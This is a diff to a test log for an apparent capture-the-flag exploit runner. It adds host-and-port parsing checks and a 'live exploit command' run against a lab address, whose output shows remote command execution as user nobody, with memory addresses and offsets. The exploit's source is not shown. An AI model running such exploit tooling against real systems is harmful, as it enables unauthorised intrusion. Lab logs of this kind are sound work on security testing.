@@ -756,7 +756,7 @@ Command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205 --cmd 'ls -la /app/tmp' \
+  --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' \
   --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
@@ -781,6 +781,39 @@ drwxr-xr-x 2 nobody nogroup    4096 May 15 04:02 .
 drwxr-xr-x 4 root   root       4096 May 14 21:58 ..
 -rw------- 1 nobody nogroup 2531328 May 15 04:02 core
 -rw-r--r-- 1 root   root          5 May 15 03:40 nginx.pid
+```
+
+Status: pass.
+
+## Demo Runner v1.9 `HOST:PORT` Target Parsing
+
+Purpose: verify `--host` can carry the port and `--port` can be omitted.
+
+Parser checks:
+
+```text
+--host 192.168.1.205:19321 -> host=192.168.1.205 port=19321
+--host 192.168.1.205 --port 19322 -> host=192.168.1.205 port=19322
+--host 192.168.1.205:1111 --port 2222 -> parser error
+```
+
+Live exploit command:
+
+```bash
+./demo_ctf_exploit_v1_9.py \
+  --host 192.168.1.205:19321 --cmd id \
+  --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
+```
+
+Observed:
+
+```text
+Target: 192.168.1.205:19321
+[04] Remote command verification setup
+winning address: 0x55e4210b2127
+winning body offset: 1376
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_9_20260515-060834.json
 ```
 
 Status: pass.
